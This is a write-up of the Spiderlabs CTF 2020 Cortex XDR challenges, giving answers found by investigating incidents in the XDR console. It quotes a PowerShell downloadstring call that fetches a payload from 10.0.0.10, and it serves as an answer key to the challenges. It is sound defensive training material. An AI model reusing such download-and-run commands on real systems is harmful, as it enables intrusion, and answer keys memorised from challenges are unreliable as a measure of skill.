# Spiderlabs CTF 2020

The event was held from Thursday, August 6 at 6:00 pm Pacific. End August 8 at 6:00 pm Pacific.

My team managed to complete all the OSINT and Cortex XDR by Palo Alto Networks challenges.

# Solutions
## Cortex XDR by Palo Alto Networks

### Watching the Detectives
Your coworker started investigating an Incident but did not finish. He gave the Incident a unique name. What is the "Incident Name"

Navigate to the investigation tab and you will find the incident name as `Possible compromise`

### Lock it up
A user in Accounting called saying they received a message from XDR that a file was quarantined. Name the file that has been quarantined by the XDR agent.

Navigate to the alert table and find the account belongs to the accounting group and you will find `pomf.exe`

### Who’s Who?
When analyzing a security event, XDR surfaces information of interest in each node of the causality flow chart. In the incident labeled 'Process requests the deletion of Windows Shadowcopies' on PeckPC, what user ran WINWORD.EXE?

Right view the incident as mentioned as look through the alerts you will find `PECKPC\Administrator`

### Who Done it
A Memory Corruption Exploit Incident was triggered where a user browsed to a malicious website. What is the username of the user that attempted to reach the malicious website?

`SPENGLERPC\Egon`

### To Reach a Compromise
Indicators of Compromise can be used in XDR to find rudimentary evidence of an attack based on a single data point (file, URL, file hash, etc). One such IOC exists. What indicator is it looking for?

Navigate to the IOC settings and you will find `www.piratebay.org`

<img src="https://user-images.githubusercontent.com/54532620/89723258-6f59f400-da26-11ea-9177-c0a7fb142c40.png">

### Captain's Log
XDR keeps logs of user activity. User Ben Widmer logged in and modified a profile. What is the name of the profile?

<img src="https://user-images.githubusercontent.com/54532620/89723271-96b0c100-da26-11ea-872f-0f7341394284.png">

`Branch Restriction Profile`

### Address Unknown
In an Incident involving the host "PeckPC", a payload is downloaded form a malicious IP address. What other host(s) have been communicating with the IP address in question?

There are a few hosts being flagged under the incident and I just tried `SpenglerPC` which turns out to the answer

### Remote Control
When analyzing a security event, XDR surfaces information of interest in each node of the causality flow chart. In the incident labeled 'Process requests the deletion of Windows Shadowcopies', an initial payload is downloaded from a remote IP address to "PeckPC'. what is the IP address?

<img src="https://user-images.githubusercontent.com/54532620/89723295-e8594b80-da26-11ea-9429-2d67891768eb.png">

Click on the powershell.exe with .downloadstring('http://10.0.0.10/payload.txt ')), then network and you will find the dest IP is `10.0.0.10`

<img src="https://user-images.githubusercontent.com/54532620/89723309-01fa9300-da27-11ea-8399-1f7e8814d31f.png">

### Debaser
When analyzing a security event, XDR surfaces information of interest in each node of the causality flow chart. In the incident labeled 'Process requests the deletion of Windows Shadowcopies' on PeckPC, powershell.exe is passed a base64 encoded string. What is the first DLL imported in this string?

Copy this record as there is the encoded string being parsed to the powershell

<img src="https://user-images.githubusercontent.com/54532620/89723316-222a5200-da27-11ea-8d9d-4f5cea71e0cb.png">

Decode the encoded string, and copy the first DLL `kernel32.dll`

<img src="https://user-images.githubusercontent.com/54532620/89723325-3ff7b700-da27-11ea-99b6-8f7bf3eb018d.png">

### She Ran Calling WildFire
Within Incident 1, several malware events have been identified. These verdicts were identified by WildFire. According to analysis of the QuarterlySummary.pdf.exe binary, several TCP connections were recorded. One of these connections was to a European Union (EU) IP address. What was the IP Address?

In this incident, right click on the QuarterlySummary.pdf.exe artifacts and open it in hash view

<img src="https://user-images.githubusercontent.com/54532620/89723330-51d95a00-da27-11ea-870c-02deb4948b38.png">

Thenafter, click on the view full report and you will find `192.251.226.206` under EU

<img src="https://user-images.githubusercontent.com/54532620/89723350-91a04180-da27-11ea-9ddc-2894a7f59aa6.png">




